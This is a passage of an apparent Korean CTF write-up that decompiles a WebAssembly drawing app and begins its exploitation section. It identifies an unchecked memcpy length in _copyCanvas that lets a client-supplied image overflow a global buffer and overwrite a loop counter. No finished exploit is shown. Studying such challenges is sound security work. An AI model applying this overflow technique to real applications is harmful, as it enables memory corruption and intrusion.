+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local2;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local3;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local4;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local5;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=6
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local6;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=7
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local7;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local8;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=9
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local9;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local10;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=11
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local11;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=12
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local12;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=13
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local13;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=14
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local14;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func18</span>(local0);
+</span></span><span style="display:flex;"><span>  local1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>  local2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  local3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20914</span>;
+</span></span><span style="display:flex;"><span>  local4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20910</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func476</span>(local1, local1, local2, local3, local4);
+</span></span><span style="display:flex;"><span>  local5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x303</span>;
+</span></span><span style="display:flex;"><span>  local6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func80</span>(local5, local6);
+</span></span><span style="display:flex;"><span>  local7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  local8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>  local9 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func670</span>(local7, local8, local8, local8, local7, local7, local7, local7);
+</span></span><span style="display:flex;"><span>  local10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) local10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20918</span>) <span style="color:#f92672">=</span> local9;
+</span></span><span style="display:flex;"><span>  local11 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>  local12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  local13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fimport_emscripten_set_main_loop</span>(local11, local12, local13); <span style="color:#75715e">// executes exported function named &#34;loop&#34; every tick
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  local14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local14;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>tick 마다 &ldquo;loop&rdquo; 함수를 실행한다.<br>
+호스트 환경에서 실행시켜주기 때문에 &ldquo;loop&quot;는 export 해야 한다.</p>
+<h4 id="loop">loop()<a hidden class="anchor" aria-hidden="true" href="#loop">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// O[0] Decompilation of $func245, known as $func12
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>export <span style="color:#e6db74">&#34;loop&#34;</span>; <span style="color:#75715e">// $func245 is exported to &#34;loop&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func12</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x1c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_1c;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_18;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x14
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_14;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_10;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20918</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func686</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20918</span>));
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  local_1c <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20918</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>);
+</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((((local_18 <span style="color:#f92672">&lt;</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x24924</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>      local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>      local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>      label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((((local_10 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>          label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_10 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>            local_14 <span style="color:#f92672">=</span> local_10;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>          };
+</span></span><span style="display:flex;"><span>          local_10 <span style="color:#f92672">=</span> (local_10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span> ;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>      };
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> local_18));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>)));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>)));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0xff</span> <span style="color:#f92672">-</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)); <span style="color:#75715e">// 4번째 -&gt; 0xff 뺴기
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      local_18 <span style="color:#f92672">=</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span> ;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fimport_emscripten_run_script</span>(<span style="color:#ae81ff">0x14fac</span> <span style="color:#75715e">/* &#34;setName()&#34; */</span> );
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">memcpy</span>(local_1c, <span style="color:#ae81ff">0x2091c</span>, <span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>  label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20918</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">7</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func687</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20918</span>));
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func489</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20910</span>), <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20918</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func496</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20910</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func499</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20910</span>), local_c, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func502</span>(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x20910</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func488</span>(local_c);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>0x2091c에 0x24924만큼 0x21924를 복사한다.</p>
+<p>대충 이제 구조를 그려보면</p>
+<pre tabindex="0"><code>0x24924 -&gt; count // while loop copy cnt
+0x21924 -&gt; Layers
+0x2191c -&gt; Name 
+0x2091c -&gt; pixels
+Updated every tick
+0x2091c = 0x21924
+</code></pre><p>이런 전역 구조체? 정도로 생각할 수 있다.</p>
+<p>4바이트씩 복사를 해주는데 이상하게 마지막 바이트는 0xff에서 빼서 넣어준다.</p>
+<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p>index.html의 일부를 보면 아래와 같다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>				<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">binary</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(String.<span style="color:#a6e22e">fromCharCode</span>(...<span style="color:#a6e22e">out</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;name&#39;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/save&#39;</span>, {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>                    },
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">name</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">img</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">binary</span>
+</span></span><span style="display:flex;"><span>                    })
+</span></span><span style="display:flex;"><span>                }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">clipboard</span>.<span style="color:#a6e22e">writeText</span>(<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Save URL copied to clipboard!&#39;</span>);
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Failed to save!&#39;</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                });
+</span></span></code></pre></div><p>binary는 클라이언트단에서 컨트롤이 가능하다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>            {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">saved</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">px</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ px }}&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ name }}&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_clearCanvas</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64ToArr</span>(<span style="color:#a6e22e">px</span>); <span style="color:#75715e">// get img binary
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arrToCharArr</span>(<span style="color:#a6e22e">bin</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_copyCanvas</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">bin</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_setName</span>(<span style="color:#a6e22e">strToCharArr</span>(<span style="color:#a6e22e">name</span>), <span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            {<span style="color:#f92672">%</span> <span style="color:#a6e22e">endif</span> <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>_copyCanvas를 호출하면서 length에 대한 경계 체크가 없다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">memcpy</span>((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>), t, l); <span style="color:#75715e">// 0x21924 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">free</span>(t);
+</span></span></code></pre></div><p>l을 컨트롤할 수 있다.<br>
+t는 malloc으로 할당받은 버퍼다.</p>
+<pre tabindex="0"><code>0x24924 -&gt; count // while loop copy cnt
+0x21924 -&gt; Layers
+0x2191c -&gt; Name 
+0x2091c -&gt; pixels
+Updated every tick
+0x2091c = 0x21924
+</code></pre><p>여기서 overflow를 내서 count를 덮을 수 있다.</p>
+<p>그리고 tick 마다 loop가 호출된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((((local_18 <span style="color:#f92672">&lt;</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x24924</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>      local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>      local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>      label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((((local_10 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>          label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_10 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>            local_14 <span style="color:#f92672">=</span> local_10;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>          };
+</span></span><span style="display:flex;"><span>          local_10 <span style="color:#f92672">=</span> (local_10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>);
